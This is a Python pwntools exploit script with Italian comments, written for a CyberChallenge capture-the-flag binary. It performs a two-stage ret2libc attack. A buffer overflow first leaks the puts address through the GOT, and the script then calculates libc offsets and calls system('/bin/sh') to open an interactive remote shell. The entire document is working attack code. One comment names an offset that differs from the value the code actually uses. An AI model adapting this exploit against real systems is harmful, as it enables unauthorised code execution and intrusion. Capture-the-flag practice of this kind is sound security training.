from pwn import *

# Carichiamo il file per estrarre gli indirizzi statici
elf = ELF('./primality_test')
# Se hai la libc del server, caricala così (altrimenti usa quella locale per test)
# libc = ELF('./libc.so.6') 

# r = process('./primality_test')
r = remote('rop.challs.cyberchallenge.it', 9130)

offset = 80

# --- ROUND 1: LEAK DELL'INDIRIZZO ---
print("[*] Fase 1: Estrazione indirizzo reale di puts...")

# Indirizzi statici dal binario (No PIE = sicuri)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x804872d

# Payload 1: [Padding] + [puts@plt] + [main] + [puts@got]
# Nota: mettiamo 'main' come return address di puts per far ripartire il programma
payload1 = b"A" * offset
payload1 += p32(puts_plt)
payload1 += p32(main_addr)
payload1 += p32(puts_got)

r.sendlineafter(b"number: ", payload1)

# Puts ci risponde con i byte dell'indirizzo reale (4 byte su 32-bit)
# Dobbiamo pulire l'output se c'è altro testo
r.recvuntil(b"!\n") # Leggi fino a "Please enter a number!" (o il messaggio finale)
leak = u32(r.recv(4))
print(f"[+] Leak ricevuto! Indirizzo reale di puts: {hex(leak)}")

# --- CALCOLO BASE LIBC E SYSTEM ---
# Ora che abbiamo un indirizzo reale, calcoliamo dove si trova tutto il resto
# Se non hai la libc del server, questi offset potrebbero variare leggermente
# In una CTF reale, usiamo 'libc-database' per trovare la versione corretta
# Per ora ipotizziamo la tua libc locale:
libc_base = leak - 0x67360 # Sostituisci 0x071cd0 con l'offset di puts nella tua libc
addr_system = libc_base + 0x3cd10 # Sostituisci con l'offset di system
addr_bin_sh = libc_base + 0x17b8cf # Sostituisci con l'offset di /bin/sh

print(f"[*] Libc Base: {hex(libc_base)}")
print(f"[*] System calcolata: {hex(addr_system)}")

# --- ROUND 2: IL COLPO FINALE ---
print("[*] Fase 2: Invio payload system('/bin/sh')...")

payload2 = b"A" * offset
payload2 += p32(addr_system)
payload2 += p32(0xdeadbeef) # Return address fasullo
payload2 += p32(addr_bin_sh)

r.sendline(payload2)

print("\n" + "="*20 + " SHELL " + "="*20)
r.interactive()
